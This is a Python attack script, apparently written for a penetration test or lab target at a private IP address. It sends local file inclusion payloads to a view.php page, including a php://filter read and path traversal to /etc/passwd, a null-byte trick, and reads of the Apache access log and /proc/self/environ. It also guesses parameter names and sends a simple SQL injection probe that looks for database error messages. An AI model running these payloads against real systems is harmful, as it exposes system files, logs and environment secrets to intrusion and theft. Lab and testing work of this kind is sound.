import urllib.request, socket, re
socket.setdefaulttimeout(10)
base = "http://192.168.18.132"

print("=== Additional LFI Payloads ===")
more_lfi = [
    "page=php://filter/convert.base64-encode/resource=/etc/passwd",
    "page=....//....//....//etc/passwd",
    "page=/etc/passwd%00",
    "page=../../../var/log/apache2/access.log",
    "page=../../../proc/self/environ",
]

for payload in more_lfi:
    try:
        url = base + "/view.php?" + payload
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read(1000).decode("utf-8", errors="ignore")
        if "root:" in content or "PATH=" in content or "HTTP" in content:
            print(f"  [LFI] {payload[:50]}")
            print(f"    {content[:150]}")
        else:
            print(f"  {payload[:50]} -> {len(content)} bytes")
    except Exception as e:
        print(f"  {payload[:50]} -> Error")

# Check for other parameters
print("\n=== Parameter Discovery ===")
# view.php might have other params
params = ["id", "file", "path", "template", "page", "doc", "include"]
for p in params:
    try:
        url = base + "/view.php?" + p + "=test"
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read()
        if len(content) > 50:
            print(f"  {p}=test -> {len(content)} bytes")
    except: pass

# Check for SQLi
print("\n=== SQLi Quick Test ===")
sqli_params = [
    ("view.php?page=" + urllib.parse.quote("tools.html'"), "GET"),
]
for url, method in sqli_params:
    try:
        full = base + "/" + url
        req = urllib.request.Request(full, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read().decode("utf-8", errors="ignore")
        errors = ["SQL", "mysql", "syntax", "error", "ORA-", "warning"]
        for e in errors:
            if e.lower() in content.lower():
                print(f"  [SQLi?] {url[:60]} - found '{e}'")
                break
    except: pass
